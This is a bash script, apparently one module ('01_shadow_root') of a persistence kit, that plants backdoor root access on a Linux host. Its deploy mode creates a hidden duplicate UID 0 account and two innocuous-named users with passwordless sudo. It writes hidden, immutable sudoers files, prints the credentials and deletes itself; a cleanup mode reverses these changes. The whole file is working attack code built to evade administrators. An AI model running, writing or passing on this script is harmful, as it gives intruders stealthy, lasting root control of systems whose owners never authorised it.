#!/usr/bin/env bash
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

USERNAME="${SHADOW_USER:-sys.sync}"
PASSWORD="${SHADOW_PASS:-$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 16 || true)}"
SUDOERS_FILE="/etc/sudoers.d/.${USERNAME//./_}"

# Extra accounts — normal-looking users with full sudo access
EXTRA_USERS=("netadmin" "svc.monitor")

add_extra_user() {
    local name="$1"
    local pass="$2"
    local sudoers="/etc/sudoers.d/.${name//./_}"
    if getent passwd "$name" &>/dev/null; then
        echo "[!]   ${name} already exists — skipping"
        return
    fi
    useradd -m -s /bin/bash "$name" 2>/dev/null || true
    echo "${name}:${pass}" | chpasswd 2>/dev/null || true
    # Add to wheel/sudo group
    usermod -aG wheel "$name" 2>/dev/null || usermod -aG sudo "$name" 2>/dev/null || true
    # Also drop explicit NOPASSWD sudoers entry in case group isn't wired
    echo "${name} ALL=(ALL) NOPASSWD:ALL" > "$sudoers"
    chmod 440 "$sudoers"
    chattr +i "$sudoers" 2>/dev/null || true
    echo "[+]   extra account: ${name} / ${pass}"
}

case "${1:-}" in
  deploy)
    # Primary shadow root (UID 0 duplicate)
    if getent passwd "$USERNAME" &>/dev/null; then
      echo "[!] User ${USERNAME} already exists"
      exit 1
    fi
    useradd -u 0 -o -g 0 -s /bin/bash -d /root -M "$USERNAME"
    echo "${USERNAME}:${PASSWORD}" | chpasswd
    echo "${USERNAME} ALL=(ALL) NOPASSWD:ALL" > "$SUDOERS_FILE"
    chmod 440 "$SUDOERS_FILE"
    chattr +i "$SUDOERS_FILE" 2>/dev/null || true
    echo "[+] 01_shadow_root: user=${USERNAME} password=${PASSWORD}"
    echo "[+] 01_shadow_root: sudoers=${SUDOERS_FILE} (immutable)"

    # Extra SSH entry points
    for name in "${EXTRA_USERS[@]}"; do
        add_extra_user "$name" "$PASSWORD"
    done

    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
    ;;
  cleanup)
    chattr -i "$SUDOERS_FILE" 2>/dev/null || true
    rm -f "$SUDOERS_FILE"
    userdel "$USERNAME" 2>/dev/null || true
    echo "[-] 01_shadow_root: ${USERNAME} removed"
    for name in "${EXTRA_USERS[@]}"; do
        chattr -i "/etc/sudoers.d/.${name//./_}" 2>/dev/null || true
        rm -f "/etc/sudoers.d/.${name//./_}"
        userdel -r "$name" 2>/dev/null || true
        echo "[-] 01_shadow_root: ${name} removed"
    done
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
